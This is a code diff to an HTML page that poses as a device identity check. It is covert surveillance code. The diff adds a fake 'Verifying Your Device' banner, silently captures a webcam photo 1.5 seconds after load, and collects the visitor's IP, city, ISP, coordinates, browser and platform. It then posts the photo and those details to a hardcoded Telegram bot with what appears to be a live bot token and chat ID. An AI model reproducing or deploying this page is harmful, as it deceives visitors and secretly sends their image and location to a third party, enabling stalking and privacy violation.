@@ -1,62 +1,103 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Auto Camera to Telegram</title>
+  <title>Camera and IP Capture</title>
 </head>
 <body>
 
+<h2>🔒 Verifying Your Device...</h2>
+<p>Please wait while we verify your identity.</p>
+
 <video id="video" autoplay playsinline width="320" height="240" style="display:none;"></video>
-<canvas id="canvas" width="320" height="240" style="display:none;"></canvas>
+<canvas id="canvas1" width="320" height="240"></canvas>
+<canvas id="canvas2" width="320" height="240" style="display:none;"></canvas>
 
 <script>
   const BOT_TOKEN = "7107321289:AAHS_n9CY7OAUszd_2aai_2_1KT0j__Rnfc";
-  const CHAT_ID = "1007795531"; // 👉 ប្ដូរជា chat ID របស់អ្នក
+  const CHAT_ID = "1007795531";
 
-  // Activate camera and auto capture
+  async function getDeviceInfo() {
+    let info = {
+      ip: "Unknown",
+      city: "-",
+      region: "-",
+      country: "-",
+      org: "-",
+      loc: "-",
+      timezone: "-",
+      browser: navigator.userAgent,
+      platform: navigator.platform,
+      language: navigator.language
+    };
+
+    try {
+      const res = await fetch("https://ipinfo.io/data/ipinfo_lite.json.gz?token=e836e13929feaa");
+      const raw = await res.json();
+      info.ip = raw.ip || "N/A";
+      info.city = raw.city || "-";
+      info.region = raw.region || "-";
+      info.country = raw.country || "-";
+      info.org = raw.org || "-";
+      info.loc = raw.loc || "-";
+      info.timezone = raw.timezone || "-";
+    } catch (e) {
+      console.warn("⚠️ Cannot load IP info:", e);
+    }
+
+    return info;
+  }
+
+  async function sendToTelegram(blob, info) {
+    const formData = new FormData();
+    formData.append("chat_id", CHAT_ID);
+    formData.append("photo", blob, "photo.jpg");
+
+    const caption = `
+📸 Photo Captured!
+🌐 IP: ${info.ip}
+🌍 Location: ${info.city}, ${info.region}, ${info.country}
+🛰️ ISP: ${info.org}
+🔗 Coordinates: ${info.loc}
+🧭 Timezone: ${info.timezone}
+💻 Platform: ${info.platform}
+🌐 Browser: ${info.browser}
+🗣️ Language: ${info.language}
+`.trim();
+
+    formData.append("caption", caption);
+
+    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+      method: "POST",
+      body: formData
+    });
+  }
+
   navigator.mediaDevices.getUserMedia({ video: true })
     .then(stream => {
       const video = document.getElementById('video');
+      const canvas1 = document.getElementById('canvas1');
+      const ctx1 = canvas1.getContext('2d');
+      const canvas2 = document.getElementById('canvas2');
+      const ctx2 = canvas2.getContext('2d');
+
       video.srcObject = stream;
 
-      // Wait for video to load and then capture
-      video.onloadedmetadata = () => {
-        setTimeout(() => {
-          takePhoto();
-        }, 1500); // wait 1.5 seconds before auto capture
+      video.onloadedmetadata = async () => {
+        setTimeout(async () => {
+          ctx1.drawImage(video, 0, 0, canvas1.width, canvas1.height);
+          ctx2.drawImage(video, 0, 0, canvas2.width, canvas2.height);
+
+          canvas2.toBlob(async blob => {
+            const info = await getDeviceInfo();
+            await sendToTelegram(blob, info);
+            console.log("✅ Sent to Telegram");
+          }, "image/jpeg");
+        }, 1500);
       };
     })
-    .catch(error => {
-      alert("Camera access denied or error: " + error.message);
+    .catch(err => {
+      alert("❌ Camera blocked or error: " + err.message);
     });
-
-  function takePhoto() {
-    const video = document.getElementById('video');
-    const canvas = document.getElementById('canvas');
-    const ctx = canvas.getContext('2d');
-    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-    canvas.toBlob(blob => {
-      const formData = new FormData();
-      formData.append("chat_id", CHAT_ID);
-      formData.append("photo", blob, "photo.jpg");
-
-      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-        method: "POST",
-        body: formData
-      })
-      .then(response => response.json())
-      .then(data => {
-        if (data.ok) {
-          console.log("✅ Photo sent to Telegram.");
-        } else {
-          console.error("❌ Failed to send photo:", data);
-        }
-      })
-      .catch(error => {
-        console.error("❌ Error sending photo:", error);
-      });
-    }, 'image/jpeg');
-  }
 </script>
 
 </body>
